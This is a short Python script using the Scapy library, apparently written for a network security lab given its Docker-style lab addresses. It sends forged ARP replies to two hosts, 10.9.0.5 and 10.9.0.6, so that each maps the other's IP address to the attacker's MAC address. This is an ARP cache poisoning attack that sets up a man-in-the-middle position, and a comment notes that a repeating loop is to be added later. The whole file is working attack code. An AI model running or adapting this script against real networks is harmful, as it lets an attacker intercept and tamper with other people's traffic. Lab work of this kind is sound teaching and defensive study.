#!/usr/bin/env python3
from scapy.all import *

IP_A  = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
MAC_M = "02:42:0a:09:00:69"
IP_B  = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

# ARP reply: op=2
def send_arp_reply(mac_dstn, mac_src, ip_dstn, ip_src):
    Arp = ARP(op=2,hwsrc=mac_src,psrc=ip_src, hwdst=mac_dstn, pdst=ip_dstn)
    Eth = Ether(dst=mac_dstn, src=mac_src)
    pkt = Eth/Arp
    sendp(pkt)

send_arp_reply(MAC_A, MAC_M, IP_A, IP_B)
send_arp_reply(MAC_B,MAC_M,IP_B,IP_A) #loop implemented later on